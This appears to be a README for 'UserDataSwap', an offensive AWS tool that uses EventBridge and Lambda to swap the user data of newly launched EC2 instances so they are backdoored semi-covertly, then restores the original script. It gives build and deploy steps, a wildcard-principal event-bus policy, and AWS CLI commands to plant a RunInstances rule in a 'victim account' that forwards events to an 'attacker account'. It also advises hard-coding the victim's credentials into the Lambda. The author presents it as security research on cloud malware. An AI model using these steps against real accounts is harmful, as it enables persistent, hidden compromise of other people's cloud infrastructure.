# UserDataSwap

User data swap is an example of an automated lambda function that runs that swaps out user data on RunInstance events. The original user data script is restored after ours is run.

This exists as an example of how an attacker could semi-covertly backdoor EC2 instances on creation. The API calls will stand out, but from the user's perspective the instance is simply taking longer to start up. This is a well known attack, only change to what I've seen elsewhere is adding Event Bridge and Lambda.

Currently there is a five minute delay between when the new instance comes up and when it is backdoored, this is to work around issues with bootstrapping at the moment. Hope to find another way to do this in the future, but we'll see.

## Wish List
* Play nicely with bootstrapping (User Data or the Terraform SSH provider) without adding a delay.
* Target individual instances or tags
* Configurable options for logging, commands run at boot, etc.

## Cross-Account Access

There is a fair amount of permissions required to deploy this, which is ok if you just want to test it out. To be useful it may make more sense to deploy in a seperate account then the one you're targeting, this way the initial set up only requires `events:PutRule` and `events:PutTargets` permissions in the victim account. I'll likely add support for this in the future, for now you can try the following to do this manually.

__WARNING__: This will allow any AWS account to run any action against the bus set up in the UserDataSwap account, probably best to set this part up in a account that isn't used for anything else. The permissive resource policy is one of the ways to get override the lack of permissions assigned to the the put-event rule to avoid needing iam:PassRole and an appropriate role already configured in the victim account. It may be possible to reduce these permissions, need to do more testing here though.

* In the UsereDataSwap account:
  * In the UserDataSwap lambda account create a new event bus named `run-instance-trigger` and give it the following resource policy.
    ```
    {
      "Version": "2012-10-17",
      "Statement": [{
        "Sid": "allow_account_to_put_events",
        "Effect": "Allow",
        "Principal": "*",
        "Action": "*",
        "Resource": "<this event bus arn>"
      }]
    }
    ```
  * Set up a rule to trigger the UserDataSwap function with the following event config.
    ```
    {
      "source": [
        "aws.ec2"
      ],
      "detail": {
        "eventSource": [
          "ec2.amazonaws.com"
        ],
        "eventName": [
          "RunInstances"
        ]
      }
    }
    ```
* In the victim account:
  * Create the run-instances event trigger:
    ```
    aws --profile victim-account events put-rule --name run-instance-trigger --state ENABLED --event-bus-name default --event-pattern '{
      "source": ["aws.ec2"],
      "detail": {      
        "eventSource": ["ec2.amazonaws.com"],
        "eventName": ["RunInstances"]
      }
    }'
    ```
  * Add a target to forward to the event-bus in the UserDataSwap account:
    ```
    aws events put-targets --rule run-instance-trigger --event-bus-name default --targets "Id"="1","Arn"="arn:aws:events:<region>:<attacker account #>:event-bus/run-instance-trigger"
    ```
* You should see the UserDataSwap triggered when a instance is created in the victim account now.
  * Update the lambda to hard code the credentials needed to make EC2 related calls in the vicitims account and deploy.

## More Info

For more info you can see my post on [Backdooring user data](https://blog.ryanjarv.sh/2020/11/27/backdooring-user-data.html)

## Related Attacks

For another similar attack with different pros/cons take a look at [EC2FakeIMDS](https://github.com/RyanJarv/EC2FakeImds). The talk and slides going over these two can be found on [my blog](https://blog.ryanjarv.sh/2020/12/04/deja-vu-in-the-cloud.html).

## Takeaway

What I was hoping to demonstrate is what I described as Cloud Malware in my talk doesn't need to be complex.

## Requirements

* AWS CLI already configured with Administrator permission
* [Docker installed](https://www.docker.com/community-edition)
* [Golang](https://golang.org)
* SAM CLI - [Install the SAM CLI](https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/serverless-sam-cli-install.html)

## Setup process

### Installing dependencies & building the target 

```shell
make build
```

## Deployment

```bash
make deploy
```

### Testing

TODO
